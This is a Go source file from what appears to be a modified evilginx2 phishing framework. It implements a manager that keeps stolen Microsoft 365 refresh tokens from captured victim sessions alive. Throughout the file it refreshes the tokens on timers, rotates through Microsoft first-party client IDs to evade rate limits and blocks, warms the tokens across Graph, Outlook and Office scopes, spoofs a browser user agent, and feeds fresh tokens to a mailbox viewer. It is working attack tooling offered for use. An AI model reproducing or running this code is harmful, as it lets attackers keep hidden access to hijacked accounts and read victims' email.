package core

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"math"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

const (
	// Primary refresh interval - every 10 minutes keeps tokens well within the ~60min access token lifetime
	TOKEN_REFRESH_INTERVAL = 10 * time.Minute
	// Aggressive keep-alive interval for critical/fresh sessions (first 2 hours after capture)
	TOKEN_KEEPALIVE_INTERVAL = 5 * time.Minute
	// Microsoft OAuth token endpoint
	MS_REFRESH_TOKEN_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
	// Default client ID for device code refresh (Microsoft Office) - kept for backward compat
	DEFAULT_REFRESH_CLIENT_ID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
	// Default scope
	DEFAULT_REFRESH_SCOPE = "offline_access openid profile https://graph.microsoft.com/.default"
	// Maximum consecutive failures before marking session as dead
	MAX_CONSECUTIVE_FAILURES = 10
	// Maximum backoff delay (30 minutes)
	MAX_BACKOFF_DELAY = 30 * time.Minute
	// Session age threshold for aggressive refresh (2 hours after capture)
	AGGRESSIVE_REFRESH_AGE = 2 * time.Hour
)

// FOCI (Family of Client IDs) - Microsoft first-party apps that share refresh tokens.
// If one client ID gets rate-limited or blocked, we rotate to another.
// All these clients belong to the same FOCI family (family ID "1") and can use the same refresh token.
var FOCIClientIDs = []struct {
	ClientID string
	Name     string
}{
	{ClientID: "d3590ed6-52b3-4102-aeff-aad2292ab01c", Name: "Microsoft Office"},
	{ClientID: "1fec8e78-bce4-4aaf-ab1b-5451cc387264", Name: "Microsoft Teams"},
	{ClientID: "27922004-5251-4030-b22d-91ecd9a37ea4", Name: "Outlook Mobile"},
	{ClientID: "4e291c71-d680-4d0e-9640-0a3358e31177", Name: "PowerAutomate"},
	{ClientID: "ab9b8c07-8f02-4f72-87fa-80105867a763", Name: "OneDrive SyncEngine"},
	{ClientID: "0ec893e0-5785-4de6-99da-4ed124e5296c", Name: "Office UWP"},
	{ClientID: "d326c1ce-6cc6-4de2-bebc-4591e5e13ef0", Name: "SharePoint"},
	{ClientID: "29d9ed98-a469-4536-ade2-f981bc1d605e", Name: "Microsoft Auth Broker"},
}

// Multi-scope warming targets - refresh against multiple scopes to keep
// the session warm across all Microsoft 365 services
var WarmingScopes = []struct {
	Name  string
	Scope string
}{
	{Name: "Graph", Scope: "offline_access openid profile https://graph.microsoft.com/.default"},
	{Name: "Outlook", Scope: "offline_access https://outlook.office365.com/.default"},
	{Name: "Office", Scope: "offline_access https://www.office.com/.default"},
	{Name: "Substrate", Scope: "offline_access https://substrate.office.com/.default"},
}

// TokenRefreshResponse from Microsoft's token endpoint
type TokenRefreshResponse struct {
	AccessToken  string `json:"access_token"`
	TokenType    string `json:"token_type"`
	ExpiresIn    int    `json:"expires_in"`
	Scope        string `json:"scope"`
	RefreshToken string `json:"refresh_token"`
	IDToken      string `json:"id_token,omitempty"`
}

// TokenRefreshError when token refresh fails
type TokenRefreshError struct {
	Error            string `json:"error"`
	ErrorDescription string `json:"error_description"`
	ErrorCodes       []int  `json:"error_codes,omitempty"`
}

// SessionHealth tracks the health status of each session's tokens
type SessionHealth struct {
	SessionID           string
	DBId                int
	Username            string
	LastRefreshTime     time.Time
	LastRefreshSuccess  bool
	ConsecutiveFailures int
	TotalRefreshes      int
	TotalFailures       int
	LastError           string
	Status              string // "healthy", "degraded", "dead", "new"
	CurrentClientIdx    int    // Index into FOCIClientIDs for rotation
	CapturedAt          time.Time
	LastWarmingTime     time.Time // Last time we warmed multiple scopes
}

// TokenAutoRefreshManager handles automatic token refresh for all sessions
type TokenAutoRefreshManager struct {
	db           *database.Database
	stopChan     chan struct{}
	running      bool
	mu           sync.RWMutex
	health       map[string]*SessionHealth // sessionID -> health
	healthMu     sync.RWMutex
	refreshCount int64 // total refreshes across all sessions
	startTime    time.Time
}

// NewTokenAutoRefreshManager creates a new auto-refresh manager
func NewTokenAutoRefreshManager(db *database.Database) *TokenAutoRefreshManager {
	return &TokenAutoRefreshManager{
		db:       db,
		stopChan: make(chan struct{}),
		running:  false,
		health:   make(map[string]*SessionHealth),
	}
}

// Start begins the background auto-refresh routine
func (m *TokenAutoRefreshManager) Start() {
	m.mu.Lock()
	if m.running {
		m.mu.Unlock()
		return
	}
	m.running = true
	m.startTime = time.Now()
	m.mu.Unlock()

	// Load health data from database custom fields
	m.loadHealthFromDB()

	go m.autoRefreshLoop()
	go m.keepAliveLoop()
	log.Info("[autorefresh] Token keep-alive system started")
	log.Info("[autorefresh] Primary interval: %v | Keep-alive interval: %v", TOKEN_REFRESH_INTERVAL, TOKEN_KEEPALIVE_INTERVAL)
	log.Info("[autorefresh] FOCI rotation: %d client IDs | Warming: %d scopes", len(FOCIClientIDs), len(WarmingScopes))
}

// Stop terminates the auto-refresh routine
func (m *TokenAutoRefreshManager) Stop() {
	m.mu.Lock()
	defer m.mu.Unlock()

	if m.running {
		close(m.stopChan)
		m.running = false
		m.saveHealthToDB()
		log.Info("[autorefresh] Token keep-alive system stopped")
	}
}

// IsRunning returns whether the auto-refresh is active
func (m *TokenAutoRefreshManager) IsRunning() bool {
	m.mu.RLock()
	defer m.mu.RUnlock()
	return m.running
}

// autoRefreshLoop runs the primary periodic token refresh
func (m *TokenAutoRefreshManager) autoRefreshLoop() {
	// Do initial refresh on startup
	m.refreshAllTokens()

	ticker := time.NewTicker(TOKEN_REFRESH_INTERVAL)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			m.refreshAllTokens()
		case <-m.stopChan:
			return
		}
	}
}

// keepAliveLoop runs aggressive keep-alive for fresh/critical sessions
func (m *TokenAutoRefreshManager) keepAliveLoop() {
	ticker := time.NewTicker(TOKEN_KEEPALIVE_INTERVAL)
	defer ticker.Stop()

	// Warming counter - warm different scopes on different cycles
	warmCycle := 0

	for {
		select {
		case <-ticker.C:
			m.keepAliveFreshSessions()

			// Every 6th cycle (~30 min), do scope warming for all healthy sessions
			warmCycle++
			if warmCycle%6 == 0 {
				m.warmAllScopes()
			}
		case <-m.stopChan:
			return
		}
	}
}

// refreshAllTokens iterates all sessions and refreshes tokens with smart scheduling
func (m *TokenAutoRefreshManager) refreshAllTokens() {
	sessions, err := m.db.ListSessions()
	if err != nil {
		log.Error("[autorefresh] Failed to list sessions: %v", err)
		return
	}

	refreshed := 0
	failed := 0
	skipped := 0

	for _, s := range sessions {
		if s.Custom == nil {
			continue
		}

		refreshToken, hasRefresh := s.Custom["dc_refresh_token"]
		if !hasRefresh || refreshToken == "" {
			continue
		}

		// Get or create health tracking
		health := m.getOrCreateHealth(s)

		// Skip dead sessions (too many consecutive failures)
		if health.ConsecutiveFailures >= MAX_CONSECUTIVE_FAILURES {
			// Apply exponential backoff - only retry after backoff period
			backoffDuration := m.calculateBackoff(health.ConsecutiveFailures)
			if time.Since(health.LastRefreshTime) < backoffDuration {
				skipped++
				continue
			}
			log.Info("[autorefresh] [%d] Retrying dead session after backoff (%v)", s.Id, backoffDuration)
		}

		// Attempt refresh with FOCI rotation on failure
		newAccess, newRefresh, err := m.doRefreshWithRotation(refreshToken, health)
		if err != nil {
			health.ConsecutiveFailures++
			health.TotalFailures++
			health.LastRefreshSuccess = false
			health.LastError = err.Error()
			health.LastRefreshTime = time.Now()
			m.updateHealthStatus(health)
			m.persistHealthForSession(s.SessionId, health)

			if health.ConsecutiveFailures == 1 {
				log.Warning("[autorefresh] [%d] %s refresh failed: %v", s.Id, s.Username, err)
			} else if health.ConsecutiveFailures == MAX_CONSECUTIVE_FAILURES {
				log.Error("[autorefresh] [%d] %s marked DEAD after %d consecutive failures: %v",
					s.Id, s.Username, health.ConsecutiveFailures, err)
			}
			failed++
			continue
		}

		// Success - update database and health
		if err := m.db.SetSessionCustom(s.SessionId, "dc_access_token", newAccess); err != nil {
			log.Error("[autorefresh] [%d] Failed to save access token: %v", s.Id, err)
			continue
		}

		// CRITICAL: Always update the refresh token if a new one was issued
		// Microsoft uses refresh token rotation - the old token is invalidated
		if newRefresh != "" && newRefresh != refreshToken {
			if err := m.db.SetSessionCustom(s.SessionId, "dc_refresh_token", newRefresh); err != nil {
				log.Error("[autorefresh] [%d] Failed to save refresh token: %v", s.Id, err)
				continue
			}
		}

		// Update health tracking
		health.ConsecutiveFailures = 0
		health.LastRefreshSuccess = true
		health.LastRefreshTime = time.Now()
		health.TotalRefreshes++
		health.LastError = ""
		m.updateHealthStatus(health)
		m.persistHealthForSession(s.SessionId, health)
		m.refreshCount++

		refreshed++
		if health.TotalRefreshes%10 == 0 {
			log.Success("[autorefresh] [%d] %s token refreshed (%d total refreshes)", s.Id, s.Username, health.TotalRefreshes)
		}
	}

	if refreshed > 0 || failed > 0 {
		log.Info("[autorefresh] Cycle complete: %d refreshed, %d failed, %d skipped", refreshed, failed, skipped)
	}
}

// keepAliveFreshSessions aggressively refreshes recently captured sessions
func (m *TokenAutoRefreshManager) keepAliveFreshSessions() {
	sessions, err := m.db.ListSessions()
	if err != nil {
		return
	}

	for _, s := range sessions {
		if s.Custom == nil {
			continue
		}

		refreshToken, hasRefresh := s.Custom["dc_refresh_token"]
		if !hasRefresh || refreshToken == "" {
			continue
		}

		health := m.getOrCreateHealth(s)

		// Only aggressively refresh sessions captured within the last 2 hours
		// or sessions that are "new" status
		if health.Status != "new" && time.Since(health.CapturedAt) > AGGRESSIVE_REFRESH_AGE {
			continue
		}

		// Skip if recently refreshed (within last 4 minutes)
		if time.Since(health.LastRefreshTime) < 4*time.Minute {
			continue
		}

		newAccess, newRefresh, err := m.doRefreshWithRotation(refreshToken, health)
		if err != nil {
			continue
		}

		m.db.SetSessionCustom(s.SessionId, "dc_access_token", newAccess)
		if newRefresh != "" && newRefresh != refreshToken {
			m.db.SetSessionCustom(s.SessionId, "dc_refresh_token", newRefresh)
		}

		health.ConsecutiveFailures = 0
		health.LastRefreshSuccess = true
		health.LastRefreshTime = time.Now()
		health.TotalRefreshes++
		m.updateHealthStatus(health)
	}
}

// warmAllScopes refreshes tokens against multiple Microsoft scopes
// to keep the session warm across all services
func (m *TokenAutoRefreshManager) warmAllScopes() {
	sessions, err := m.db.ListSessions()
	if err != nil {
		return
	}

	warmed := 0
	for _, s := range sessions {
		if s.Custom == nil {
			continue
		}

		refreshToken, hasRefresh := s.Custom["dc_refresh_token"]
		if !hasRefresh || refreshToken == "" {
			continue
		}

		health := m.getOrCreateHealth(s)
		if health.Status == "dead" {
			continue
		}

		// Skip if recently warmed (within last 25 minutes)
		if time.Since(health.LastWarmingTime) < 25*time.Minute {
			continue
		}

		currentRT := refreshToken
		for _, ws := range WarmingScopes {
			_, newRT, err := m.doRefreshWithScope(currentRT, ws.Scope, health)
			if err != nil {
				log.Debug("[autorefresh] [%d] Warming %s failed: %v", s.Id, ws.Name, err)
				continue
			}
			if newRT != "" {
				currentRT = newRT
			}
		}

		// Update the refresh token if it changed during warming
		if currentRT != refreshToken {
			m.db.SetSessionCustom(s.SessionId, "dc_refresh_token", currentRT)
		}

		health.LastWarmingTime = time.Now()
		warmed++
	}

	if warmed > 0 {
		log.Debug("[autorefresh] Scope warming complete: %d sessions warmed across %d scopes", warmed, len(WarmingScopes))
	}
}

// doRefreshWithRotation attempts refresh with the current client ID,
// and rotates to the next FOCI client on failure
func (m *TokenAutoRefreshManager) doRefreshWithRotation(refreshToken string, health *SessionHealth) (string, string, error) {
	// Try current client first
	clientIdx := health.CurrentClientIdx % len(FOCIClientIDs)
	client := FOCIClientIDs[clientIdx]

	accessToken, newRefresh, err := m.doRefresh(refreshToken, client.ClientID, DEFAULT_REFRESH_SCOPE)
	if err == nil {
		return accessToken, newRefresh, nil
	}

	// Check if this is a token revocation error (password changed, etc.)
	if isTokenRevoked(err.Error()) {
		return "", "", fmt.Errorf("token revoked (likely password change): %v", err)
	}

	// Rotate through FOCI clients on rate-limit or transient errors
	if isRetryableError(err.Error()) {
		for i := 1; i < len(FOCIClientIDs); i++ {
			nextIdx := (clientIdx + i) % len(FOCIClientIDs)
			nextClient := FOCIClientIDs[nextIdx]

			accessToken, newRefresh, err = m.doRefresh(refreshToken, nextClient.ClientID, DEFAULT_REFRESH_SCOPE)
			if err == nil {
				health.CurrentClientIdx = nextIdx
				log.Debug("[autorefresh] Rotated to FOCI client: %s", nextClient.Name)
				return accessToken, newRefresh, nil
			}

			// If token is revoked, stop trying
			if isTokenRevoked(err.Error()) {
				return "", "", fmt.Errorf("token revoked: %v", err)
			}
		}
	}

	return "", "", err
}

// doRefreshWithScope performs refresh with a specific scope (for warming)
func (m *TokenAutoRefreshManager) doRefreshWithScope(refreshToken string, scope string, health *SessionHealth) (string, string, error) {
	clientIdx := health.CurrentClientIdx % len(FOCIClientIDs)
	client := FOCIClientIDs[clientIdx]
	return m.doRefresh(refreshToken, client.ClientID, scope)
}

// doRefresh performs the actual OAuth refresh request
func (m *TokenAutoRefreshManager) doRefresh(refreshToken string, clientID string, scope string) (accessToken string, newRefreshToken string, err error) {
	data := url.Values{}
	data.Set("client_id", clientID)
	data.Set("grant_type", "refresh_token")
	data.Set("refresh_token", refreshToken)
	data.Set("scope", scope)

	req, err := http.NewRequest("POST", MS_REFRESH_TOKEN_URL, strings.NewReader(data.Encode()))
	if err != nil {
		return "", "", fmt.Errorf("failed to create request: %v", err)
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
	req.Header.Set("Origin", "https://login.microsoftonline.com")

	client := GetHttpClient()
	resp, err := client.Do(req)
	if err != nil {
		return "", "", fmt.Errorf("request failed: %v", err)
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", "", fmt.Errorf("failed to read response: %v", err)
	}

	if resp.StatusCode != 200 {
		var errResp TokenRefreshError
		json.Unmarshal(body, &errResp)
		return "", "", fmt.Errorf("[%d] %s: %s", resp.StatusCode, errResp.Error, errResp.ErrorDescription)
	}

	var tokenResp TokenRefreshResponse
	if err := json.Unmarshal(body, &tokenResp); err != nil {
		return "", "", fmt.Errorf("failed to parse response: %v", err)
	}

	return tokenResp.AccessToken, tokenResp.RefreshToken, nil
}

// RefreshSessionToken manually refreshes a specific session's token (on-demand)
func (m *TokenAutoRefreshManager) RefreshSessionToken(sessionId string) error {
	sessions, err := m.db.ListSessions()
	if err != nil {
		return fmt.Errorf("failed to list sessions: %v", err)
	}

	for _, s := range sessions {
		if s.SessionId != sessionId {
			continue
		}

		if s.Custom == nil {
			return fmt.Errorf("session has no custom data")
		}

		refreshToken, hasRefresh := s.Custom["dc_refresh_token"]
		if !hasRefresh || refreshToken == "" {
			return fmt.Errorf("session has no refresh token")
		}

		health := m.getOrCreateHealth(s)

		newAccess, newRefresh, err := m.doRefreshWithRotation(refreshToken, health)
		if err != nil {
			health.ConsecutiveFailures++
			health.TotalFailures++
			health.LastRefreshSuccess = false
			health.LastError = err.Error()
			health.LastRefreshTime = time.Now()
			m.updateHealthStatus(health)
			return err
		}

		if err := m.db.SetSessionCustom(s.SessionId, "dc_access_token", newAccess); err != nil {
			return fmt.Errorf("failed to save access token: %v", err)
		}

		if newRefresh != "" && newRefresh != refreshToken {
			if err := m.db.SetSessionCustom(s.SessionId, "dc_refresh_token", newRefresh); err != nil {
				return fmt.Errorf("failed to save refresh token: %v", err)
			}
		}

		health.ConsecutiveFailures = 0
		health.LastRefreshSuccess = true
		health.LastRefreshTime = time.Now()
		health.TotalRefreshes++
		health.LastError = ""
		m.updateHealthStatus(health)

		log.Success("[autorefresh] Session %s token refreshed on-demand", sessionId)
		return nil
	}

	return fmt.Errorf("session not found: %s", sessionId)
}

// RefreshAndGetToken refreshes a session and returns the fresh access token.
// This is used by the token feed when serving tokens to the mailbox viewer
// to ensure the token is always fresh at the moment of access.
func (m *TokenAutoRefreshManager) RefreshAndGetToken(sessionId string) (string, error) {
	sessions, err := m.db.ListSessions()
	if err != nil {
		return "", fmt.Errorf("failed to list sessions: %v", err)
	}

	for _, s := range sessions {
		if s.SessionId != sessionId {
			continue
		}

		if s.Custom == nil {
			return "", fmt.Errorf("session has no custom data")
		}

		refreshToken, hasRefresh := s.Custom["dc_refresh_token"]
		if !hasRefresh || refreshToken == "" {
			// Return existing access token if no refresh token available
			if at := s.Custom["dc_access_token"]; at != "" {
				return at, nil
			}
			return "", fmt.Errorf("session has no tokens")
		}

		health := m.getOrCreateHealth(s)

		// If last refresh was very recent (< 2 min), return cached token
		if time.Since(health.LastRefreshTime) < 2*time.Minute && health.LastRefreshSuccess {
			if at := s.Custom["dc_access_token"]; at != "" {
				return at, nil
			}
		}

		// Do a fresh refresh
		newAccess, newRefresh, err := m.doRefreshWithRotation(refreshToken, health)
		if err != nil {
			// Return existing access token if refresh fails
			if at := s.Custom["dc_access_token"]; at != "" {
				log.Warning("[autorefresh] On-demand refresh failed for %s, returning cached token: %v", sessionId, err)
				return at, nil
			}
			return "", err
		}

		m.db.SetSessionCustom(s.SessionId, "dc_access_token", newAccess)
		if newRefresh != "" && newRefresh != refreshToken {
			m.db.SetSessionCustom(s.SessionId, "dc_refresh_token", newRefresh)
		}

		health.ConsecutiveFailures = 0
		health.LastRefreshSuccess = true
		health.LastRefreshTime = time.Now()
		health.TotalRefreshes++
		m.updateHealthStatus(health)

		return newAccess, nil
	}

	return "", fmt.Errorf("session not found: %s", sessionId)
}

// GetRefreshStats returns statistics about token refresh status
func (m *TokenAutoRefreshManager) GetRefreshStats() (total int, withRefresh int) {
	sessions, err := m.db.ListSessions()
	if err != nil {
		return 0, 0
	}

	total = len(sessions)
	for _, s := range sessions {
		if s.Custom != nil {
			if rt, ok := s.Custom["dc_refresh_token"]; ok && rt != "" {
				withRefresh++
			}
		}
	}
	return total, withRefresh
}

// GetHealthReport returns detailed health for all tracked sessions
func (m *TokenAutoRefreshManager) GetHealthReport() []*SessionHealth {
	m.healthMu.RLock()
	defer m.healthMu.RUnlock()

	var report []*SessionHealth
	for _, h := range m.health {
		hCopy := *h
		report = append(report, &hCopy)
	}
	return report
}

// GetSessionHealth returns health info for a specific session
func (m *TokenAutoRefreshManager) GetSessionHealth(sessionId string) *SessionHealth {
	m.healthMu.RLock()
	defer m.healthMu.RUnlock()

	if h, ok := m.health[sessionId]; ok {
		hCopy := *h
		return &hCopy
	}
	return nil
}

// GetTotalRefreshCount returns the total number of successful refreshes since start
func (m *TokenAutoRefreshManager) GetTotalRefreshCount() int64 {
	return m.refreshCount
}

// GetUptime returns how long the auto-refresh has been running
func (m *TokenAutoRefreshManager) GetUptime() time.Duration {
	m.mu.RLock()
	defer m.mu.RUnlock()
	if m.startTime.IsZero() {
		return 0
	}
	return time.Since(m.startTime)
}

// ResetSessionHealth resets a session's health (useful after manual recovery)
func (m *TokenAutoRefreshManager) ResetSessionHealth(sessionId string) {
	m.healthMu.Lock()
	defer m.healthMu.Unlock()
	if h, ok := m.health[sessionId]; ok {
		h.ConsecutiveFailures = 0
		h.LastError = ""
		h.Status = "healthy"
		log.Info("[autorefresh] Reset health for session %s", sessionId)
	}
}

// --- Internal helper functions ---

// getOrCreateHealth returns existing health or creates new tracking
func (m *TokenAutoRefreshManager) getOrCreateHealth(s *database.Session) *SessionHealth {
	m.healthMu.Lock()
	defer m.healthMu.Unlock()

	if h, ok := m.health[s.SessionId]; ok {
		return h
	}

	capturedAt := time.Unix(s.CreateTime, 0)

	h := &SessionHealth{
		SessionID:        s.SessionId,
		DBId:             s.Id,
		Username:         s.Username,
		Status:           "new",
		CapturedAt:       capturedAt,
		LastRefreshTime:  time.Time{},
		CurrentClientIdx: 0,
	}

	// Load persisted health data if available
	if s.Custom != nil {
		if v, ok := s.Custom["_health_failures"]; ok {
			fmt.Sscanf(v, "%d", &h.ConsecutiveFailures)
		}
		if v, ok := s.Custom["_health_total"]; ok {
			fmt.Sscanf(v, "%d", &h.TotalRefreshes)
		}
		if v, ok := s.Custom["_health_client_idx"]; ok {
			fmt.Sscanf(v, "%d", &h.CurrentClientIdx)
		}
		if v, ok := s.Custom["_health_last_error"]; ok {
			h.LastError = v
		}
	}

	m.updateHealthStatusLocked(h)
	m.health[s.SessionId] = h
	return h
}

// updateHealthStatus determines the session status based on health metrics
func (m *TokenAutoRefreshManager) updateHealthStatus(health *SessionHealth) {
	m.healthMu.Lock()
	defer m.healthMu.Unlock()
	m.updateHealthStatusLocked(health)
}

func (m *TokenAutoRefreshManager) updateHealthStatusLocked(health *SessionHealth) {
	switch {
	case health.ConsecutiveFailures >= MAX_CONSECUTIVE_FAILURES:
		health.Status = "dead"
	case health.ConsecutiveFailures >= 3:
		health.Status = "degraded"
	case health.TotalRefreshes == 0:
		health.Status = "new"
	default:
		health.Status = "healthy"
	}
}

// calculateBackoff returns exponential backoff duration
func (m *TokenAutoRefreshManager) calculateBackoff(failures int) time.Duration {
	// Base: 2 minutes, doubles each failure beyond threshold, max 30 minutes
	backoff := time.Duration(math.Pow(2, float64(failures-MAX_CONSECUTIVE_FAILURES))) * 2 * time.Minute
	if backoff > MAX_BACKOFF_DELAY {
		backoff = MAX_BACKOFF_DELAY
	}
	return backoff
}

// persistHealthForSession saves health metadata to the database
func (m *TokenAutoRefreshManager) persistHealthForSession(sessionId string, health *SessionHealth) {
	m.db.SetSessionCustom(sessionId, "_health_failures", fmt.Sprintf("%d", health.ConsecutiveFailures))
	m.db.SetSessionCustom(sessionId, "_health_total", fmt.Sprintf("%d", health.TotalRefreshes))
	m.db.SetSessionCustom(sessionId, "_health_client_idx", fmt.Sprintf("%d", health.CurrentClientIdx))
	if health.LastError != "" {
		errTrunc := health.LastError
		if len(errTrunc) > 200 {
			errTrunc = errTrunc[:200]
		}
		m.db.SetSessionCustom(sessionId, "_health_last_error", errTrunc)
	}
}

// loadHealthFromDB preloads health data from database on startup
func (m *TokenAutoRefreshManager) loadHealthFromDB() {
	sessions, err := m.db.ListSessions()
	if err != nil {
		return
	}

	loaded := 0
	for _, s := range sessions {
		if s.Custom == nil {
			continue
		}
		if _, ok := s.Custom["dc_refresh_token"]; !ok {
			continue
		}
		m.getOrCreateHealth(s)
		loaded++
	}
	if loaded > 0 {
		log.Info("[autorefresh] Loaded health data for %d sessions", loaded)
	}
}

// saveHealthToDB persists all health data to database (called on shutdown)
func (m *TokenAutoRefreshManager) saveHealthToDB() {
	m.healthMu.RLock()
	defer m.healthMu.RUnlock()

	for sid, h := range m.health {
		m.persistHealthForSession(sid, h)
	}
}

// isTokenRevoked checks if the error indicates the token has been revoked
// (password change, admin revocation, account disabled, etc.)
func isTokenRevoked(errMsg string) bool {
	revokeIndicators := []string{
		"AADSTS50173",  // Token has been revoked
		"AADSTS70008",  // Refresh token has expired (after 90 days of inactivity)
		"AADSTS700084", // Refresh token was revoked
		"AADSTS50078",  // User needs to re-authenticate
		"AADSTS50076",  // Need MFA
		"AADSTS700082", // Expired refresh token
		"AADSTS50053",  // Account locked
		"AADSTS50057",  // Account disabled
		"invalid_grant",
	}
	for _, indicator := range revokeIndicators {
		if strings.Contains(errMsg, indicator) {
			return true
		}
	}
	return false
}

// isRetryableError checks if the error is transient and worth retrying with another client
func isRetryableError(errMsg string) bool {
	retryIndicators := []string{
		"AADSTS50196",    // Server busy
		"AADSTS700016",   // Application not found (wrong client ID)
		"429",            // Rate limited
		"500",            // Server error
		"503",            // Service unavailable
		"request failed", // Network error
		"timeout",
	}
	for _, indicator := range retryIndicators {
		if strings.Contains(errMsg, indicator) {
			return true
		}
	}
	return false
}

// maskToken returns a masked version of the token for logging
func maskToken(token string) string {
	if len(token) <= 20 {
		return "***"
	}
	return token[:8] + "..." + token[len(token)-8:]
}
